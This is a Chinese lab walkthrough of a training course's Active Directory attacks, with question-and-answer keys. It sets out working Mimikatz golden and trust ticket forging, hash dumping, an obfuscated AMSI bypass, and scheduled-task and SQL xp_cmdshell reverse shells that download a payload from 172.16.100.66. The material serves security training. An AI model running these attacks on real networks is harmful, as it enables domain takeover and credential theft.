      GqKCA4gEggOE2pXAp7qlXodFtjWijF0xryRTKewkMw4/DCOaP/7tImo4652Fn1jXeKuZmiC0lB/sHJHZ
      RmfbdpSuApbQbRKONObKfMHhXNjO8dwZ0XNXvfge+SfYOmz1TCyeY/ozWb6n4T5CXlY8MqFoXcmdblZ9
      rxUbPDsOJqXxahheTDnOnfnTV7QtWuZTXCxiZiQfBR+nTIhtIVBHGiSVc/Z/GBA9cIsT5hRhacdq9Jiv
      9uT+qiyGJPubr55A11zd5Xms6jIgHSADoQS4PpIJUCgSQUj8ofESzA31g3ReRthGJEPmGYm5am/THit7
      xRv2I7U+KlopXbA5SX3/DCSBFaV5SAfg2F0vLKjenaeu8bLssT1jaIzfi4YL9tQSo61HaPMvKj/YISwr
      6iboTDlpFmpSICS4nDCLWn9zNSgo3WtNBfBGda9NoBjir2GiCKSEq98NtmRE8LbJ24Zotw3LIgrVXV0f
      0XS81j5morIdOgqVZYKFVmKj6JbcStl+BM818iIsxO8w76cytk0OZ4AugBa1/dcfdt6kU5t7itBZfklu
      j2m+dgFX8RFNGAzhD/dLLHjevrTZsZ6O0jULrUes5uuhCgI3A06iNPRy+jSygxNy10V8NKXPb1XjLvQx
      Cb8f4+WmenpOHB08/Wux6s/f1uHUJyqx/VqS8Al/m/nM/BvqOXGZNuvPu2lvlHw5pMl/dMM4Q7jiGrlg
      tGdDW+fbqB3hIQta1yGFhGmZJNe7W+r6ZrFT2vUwMk0XdP8+/Sg/Emp0uB2bOsapJhHrJ690GhbrPGrL
      4cRxGWENh9dXqI7T7wumD0Svicky8j+3jAccBNkIcuwoWM7DL8Fi4rs5WSWfx+fCbZCyJLdy0Fv+bAPw
      qkb1ypbVz73fy8Dg6XLWwEo3ovM86UGnqjaddF7qN36d7BtbN8aIo4TuwQZAD7esXnryMglJJqenwsz+
      tgI9HHUcEO15SiVYwnnDLftf8fhbSaPZDlyBpDIAwLDKYDnVPt0ZhA1NFRDXi07WIda4SyaEpInDsF6P
      XDQscAzC+SnFaXxjH5+8TPYIetJmhx7mDATBkGZyY3uca8KpxppGBm6pTwdDViOYXmpUzr+nLnJEk90Q
      Er+noKD7wWWAUrvgdS+H9baZhfOKh6zAzujkl9qbIddtGFPF6gXOnB905tjEftrx0QQC0ySuGax5HbtD
      CxAV7pfyn7zKo4IBBzCCAQOgAwIBAKKB+wSB+H2B9TCB8qCB7zCB7DCB6aArMCmgAwIBEqEiBCAmVhu2
      Q0LStKem6mlzjXM6zGv59/M9Pgv4tSbz5ps0GKEcGxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKIa
      MBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyMjAyMTYwODA0MTdaphEYDzIw
      MjIwMjE2MTgwNDE3WqcRGA8yMDIyMDIyMzA4MDQxN1qoERsPTU9ORVlDT1JQLkxPQ0FMqSswKaADAgEC
      oSIwIBsEY2lmcxsYbWNvcnAtZGMubW9uZXljb3JwLmxvY2Fs

  ServiceName           :  cifs/mcorp-dc.moneycorp.local
  ServiceRealm          :  MONEYCORP.LOCAL
  UserName              :  Administrator
  UserRealm             :  dollarcorp.moneycorp.local
  StartTime             :  2/16/2022 12:04:17 AM
  EndTime               :  2/16/2022 10:04:17 AM
  RenewTill             :  2/23/2022 12:04:17 AM
  Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  JlYbtkNC0rSnpuppc41zOsxr+ffzPT4L+LUm8+abNBg=
```

访问父域的文件系统
```

PS C:\ad> ls \\mcorp-dc.moneycorp.local\c$


    Directory: \\mcorp-dc.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   4:33 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---        2/16/2019   9:14 PM                Users
d-----        8/20/2020   2:57 AM                Windows
```

问题：SID history injected to escalate to Enterprise Admins
答案：S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519


# Learning Objective 20:
Task
● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.

这一节主要是跨域访问，子域到父域(Child to Parent)

下面命令制作一张用户krbtgt到父域的TGT
由于之前我们已经拿到了krbtgt的hash值，这里直接使用
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
```
执行
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-
21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da267
96f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
ServiceKey: ff46a9d8bd66c6efd77603da26796f35 - rc4_hmac_nt
Lifetime  : 2/16/2022 12:30:00 AM ; 2/14/2032 12:30:00 AM ; 2/14/2032 12:30:00 AM
-> Ticket : C:\AD\krbtgt_tkt.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

TGT文件已生成在:```C:\AD\krbtgt_tkt.kirbi```

下面命令把TGT注入到mimikatz中
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'
```

使用下面两个命令之一验证上面操作是否成功
```
gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
```
或者
```
ls \\mcorp-dc.moneycorp.local\c$
```

利用上面已经取得的权限，为mcorp-dc添加一个定时任务
```
schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User3666" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

触发定时任务
```
schtasks /Run /S mcorp-dc.moneycorp.local /TN "User3666"
```

收到反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.1.1] 59665


Windows PowerShell running as user MCORP-DC$ on MCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
mcorp-dc
PS C:\Windows\system32>
```

要马上byopass AMSI，不然可能会卡死
```
PS C:\Windows\system32>S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' )
-VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).
"g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`U
Ll},${t`RuE} )
PS C:\Windows\system32>
```

在mcorp-dc，把mimikatz从远程服务器导入到内存中
```
iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

dump出mcorp-dc中的所有用户的哈希
```
PS C:\Windows\system32> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : mcorp / S-1-5-21-280534878-1496970234-700767426

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 71d04f9d50ceb1f64de7a09f23e6dc4c

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ed277dd7a7a8a88d9ea0de839e454690

[略]
```

问题：NTLM hash of krbtgt of moneycorp.local
答案：ed277dd7a7a8a88d9ea0de839e454690

问题：NTLM hash of enterprise administrator - Administrator
答案：71d04f9d50ceb1f64de7a09f23e6dc4c

问题：Privileges on mcorp-dc after executing scheduled task
答案：nt authority\system

问题：Service for which a TGS is requested from eurocorp-dc
答案：CIFS（这题应该是Learning Objective - 21）


# Learning Objective 21:
> Task
> ● With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.

这一节主要是跨林访问（Across Forest）

用Administrator打开一个DA的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```

枚举dcorp-dc的所有trust
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::trust /patch

【略】

Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430

 [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
        * aes256_hmac       1600f6d433093cc534f579dd75b44a8a2f37b983904c507b74f8eb436cd04f4e
        * aes128_hmac       948cc8e718be3f8eecf498cfa5d6996b
        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 1/29/2022 1:19:50 AM - CLEAR   - 9e 38 00 0f f1 61 6b 4f 03 ef 9a 4d 66 44 ce 9f 15 1a ee 57 82 dc 5a a0 92 db 99 03
        * aes256_hmac       d368377248c50ef663e50cf9109512d018b48964ff08e6e06c93ae967ed7ebce
        * aes128_hmac       f523829c0e7edc43630ed264b7864de9
        * rc4_hmac_nt       a4ba38d6d528d447371bc2bf9edd8d18

 [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 1/29/2022 1:19:50 AM - CLEAR   - 9e 38 00 0f f1 61 6b 4f 03 ef 9a 4d 66 44 ce 9f 15 1a ee 57 82 dc 5a a0 92 db 99 03
        * aes256_hmac       b21647a7b6a2996c09c96985d907d13d0bb997016bfa177cc89132fdebd7c6c5
        * aes128_hmac       b7e4341a1b8a9cbe43b8b92447c31c07
        * rc4_hmac_nt       a4ba38d6d528d447371bc2bf9edd8d18
```
EUROCORP.LOCAL 和  DOLLARCORP.MONEYCORP.LOCAL之间有一条信任路径


伪造一条到EUROCORP.LOCAL的TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
```
执行
```
PS C:\ad> Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-
21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a4
30 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
ServiceKey: cccb3ce736c4d39039b48c79f075a430 - rc4_hmac_nt
Service   : krbtgt
Target    : EUROCORP.LOCAL
Lifetime  : 2/16/2022 5:20:34 AM ; 2/14/2032 5:20:34 AM ; 2/14/2032 5:20:34 AM
-> Ticket : C:\AD\kekeo_old\trust_forest_tkt.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

制作一张可以访问EUROCORP.LOCAL的TGS

```
.\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
```

执行：
```
PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local

  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Ticket    : C:\AD\kekeo_old\trust_forest_tkt.kirbi
Service   : krbtgt / EUROCORP.LOCAL @ dollarcorp.moneycorp.local
Principal : Administrator @ dollarcorp.moneycorp.local

> CIFS/eurocorp-dc.eurocorp.local
  * Ticket in file 'CIFS.eurocorp-dc.eurocorp.local.kirbi'
```

将 TGS 呈现给目标服务
```
.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
```

执行
```
PS C:\ad\kekeo_old> .\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi

  .#####.   KiRBikator 1.1 (x86) built on Dec  8 2016 00:31:14
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Destination : Microsoft LSA API (multiple)
 < .\CIFS.eurocorp-dc.eurocorp.local.kirbi (RFC KRB-CRED (#22))
 > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~eurocorp-dc.eurocorp.local@EUROCORP.LOCAL : injected
```

查看目标计算机里的SharedwithDCorp文件夹
```
PS C:\ad\kekeo_old> ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\


    Directory: \\eurocorp-dc.eurocorp.local\SharedwithDCorp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/18/2019   3:18 AM             29 secret.txt
```

拷贝到本地
```
PS C:\ad\kekeo_old> copy \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt .\
```

读取
```
PS C:\ad\kekeo_old> cat .\secret.txt
Dollarcorp DAs can read this!
```


同样的，也可以使用Rubeus.exe，复用上面已经生成的TGT，生成TGS
```
.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```

访问对方林中的计算机
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

问题：Contents of secret.txt on eurocorp-dc
答案：Dollarcorp DAs can read this!


# Learning Objective 22:
> Task
> ● Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.

## 原理
微软的SQL 服务通常部署在一个 Windows 域中
SQL Servers为横向移动提供了非常好的选项，因为域用户可以映射到数据库角色
数据库链接允许 SQL Server 访问外部数据源，如其他SQL Server和OLE DB 数据源
如果数据库链接在 SQL 服务器之间，也就是链接的SQL 服务器，则可以执行存储过程，数据库链接甚至可以对跨林信任有效


枚举当前账号是否对MSSQLSERVER有权限，收集信息
```
PS C:\ad\PowerUpSQL-master> Import-Module .\PowerUpSQL.psd1
WARNING: The names of some imported commands from the module 'PowerUpSQL' include unapproved verbs that might make them
 less discoverable. To find the commands with unapproved verbs, run the Import-Module command again with the Verbose
parameter. For a list of approved verbs, type Get-Verb.
PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain |Get-SQLServerInfo 

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1724
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student366
IsSysadmin             : No
ActiveSessions         : 1

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1724
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student366
IsSysadmin             : No
ActiveSessions         : 1
```

或者检查当前账号是否有权限进入mssql（如果这里枚举没有Accessible的结果，可以重启一下VM）
```
PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 


ComputerName                           Instance                                    Status
------------                           --------                                    ------
dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local,1433 Accessible
dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local      Accessible
dcorp-mgmt.dollarcorp.moneycorp.local  dcorp-mgmt.dollarcorp.moneycorp.local       Not Accessible
dcorp-mgmt.dollarcorp.moneycorp.local  dcorp-mgmt.dollarcorp.moneycorp.local,1433  Not Accessible
dcorp-sql1.dollarcorp.moneycorp.local  dcorp-sql1.dollarcorp.moneycorp.local       Not Accessible
dcorp-sql1.dollarcorp.moneycorp.local  dcorp-sql1.dollarcorp.moneycorp.local,1433  Not Accessible
DCORP-STD366                           DCORP-STD366                                Not Accessible
```

只有dcorp-mssql.dollarcorp.moneycorp.local 是Accessible

手动枚举mssql链接
```
PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql 

Version     : SQL Server 2017
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student366
Links       : {DCORP-SQL1}

Version     : SQL Server 2017
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2017
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2017
Instance    : EU-SQL
CustomQuery :
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

下面命令执行whoami命令，mysql实例(根据上面枚举到有权限的结果)指定```dcorp-mssql.dollarcorp.moneycorp.local```

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local,1433 -Query "exec master..xp_cmdshell 'whoami'"
```

执行
```
PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"


Version     : SQL Server 2017
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student366
Links       : {DCORP-SQL1}

Version     : SQL Server 2017
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2017
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2017
Instance    : EU-SQL
CustomQuery : {nt authority\network service, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

在最后一组的CustomQuery里打印出了whoami命令的执行结果：```nt authority\network service```

下面命令触发一个反弹shell
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1'')"'
```

收到反弹shell
```

PS C:\Windows\system32> cd c:/ad
PS C:\ad>
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.15.17] 50260
Windows PowerShell running as user EU-SQL$ on EU-SQL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\network service
PS C:\Windows\system32> hostname
eu-sql
```

问题：First SQL Server linked to dcorp-mssql
答案：DCORP-SQL1

问题：Name of SQL Server user used to establish link between dcorp-sql1 and dcorp-mgmt
答案：sqluser

问题：SQL Server privileges on eu-sql
答案：Sysadmin

问题：Privileges on operating system of eu-sql
答案：nt authority\network service


